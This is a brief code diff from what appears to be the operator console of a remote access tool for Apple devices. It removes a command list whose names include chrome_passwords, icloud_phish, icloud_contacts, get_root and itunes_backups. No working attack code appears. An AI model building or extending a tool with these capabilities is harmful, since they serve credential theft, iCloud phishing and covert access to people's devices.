@@ -25,9 +25,6 @@ MESSAGE_INPUT = "\033[1m" + "[?] " + "\033[0m"
 MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
 MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
 
-commands = ["help", "status", "clients", "connect", "clear", "get_info", "get_root", "get_computer_name",
-            "get_shell_info", "chrome_passwords", "icloud_contacts", "icloud_phish", "find_my_iphone",
-            "screenshot", "itunes_backups", "kill_client"]
 status_messages = []
 
 
